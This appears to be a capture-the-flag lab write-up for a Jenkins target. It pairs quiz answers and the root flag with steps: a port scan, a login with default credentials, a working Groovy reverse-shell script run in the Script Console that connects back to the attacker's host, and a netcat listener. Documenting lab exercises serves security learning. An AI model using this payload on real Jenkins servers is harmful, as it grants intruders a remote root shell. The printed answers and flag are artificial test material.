# Tasks
- What does the acronym CVE stand for?
	- Common Vulnerabilities and Exposures
- What do the three letters in CIA, referring to the CIA triad in cybersecurity, stand for?
	- Confidentiality, Integrity, Availability 
- What is the version of the service running on port 8080?
	- Jetty 9.4.39.v20210325
- What version of Jenkins is running on the target?
	- 2.289.1
- What type of script is accepted as input on the Jenkins Script Console?
	- Groovy
- What would the "String cmd" variable from the Groovy Script snippet be equal to if the Target VM was running Windows?
	- cmd.exe
- What is a different command than "ip a" we could use to display our network interfaces' information on Linux?
	- ifconfig
- What switch should we use with netcat for it to use UDP transport mode?
	- -u
- What is the term used to describe making a target host initiate a connection back to the attacker host?
	- reverse shell
- Submit root flag
	- 9cdfb439c7876e703e307864c9167a15


# Steps
- First, let's start with rustscan.
```
rustscan --ulimit 5000 --addresses "10.129.1.93" --top -- -sC -sV
```
- We then get results that we have Jenkins running on this box!
```
PORT     STATE SERVICE REASON         VERSION  
8080/tcp open  http    syn-ack ttl 63 Jetty 9.4.39.v20210325  
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1  
|_http-server-header: Jetty(9.4.39.v20210325)  
|_http-title: Site doesn't have a title (text/html;charset=utf-8).  
| http-robots.txt: 1 disallowed entry    
|_/
```
- We are able to use the default credentials of root/password to get into the instance
- We then have access to the Script Console, which allows us to run Groovy without any restrictions. Uh oh...
- We can definitely run a reverse shell using this!
- We'll achieve that using this:
```
String host="10.10.14.21";
int port=8000;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())
{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());whi
le(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try
{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
- We just need to do a netcat listener on our machine to get a connection before running this
```
nc -lvnp 8000
```
- We are able to get a connection as root!
- From here, we can read out the flag with no issues
```
whoami
root

cd /root
ls
flag.txt

cat flag.txt
9cdfb439c7876e703e307864c9167a15
```
